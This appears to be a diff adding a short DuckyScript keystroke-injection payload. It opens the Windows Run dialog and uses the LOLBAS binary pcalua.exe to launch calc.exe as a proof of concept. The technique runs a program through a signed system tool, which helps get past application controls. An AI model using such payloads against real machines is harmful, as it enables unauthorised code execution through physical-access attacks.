@@ -1,0 +1,6 @@
+REM by JOB
+REM uses programm compat assist open binary, more info here https://lolbas-project.github.io/lolbas/Binaries/Pcalua/
+GUI r
+DEFAULT_DELAY 350
+STRING pcalua.exe -a calc.exe
+ENTER
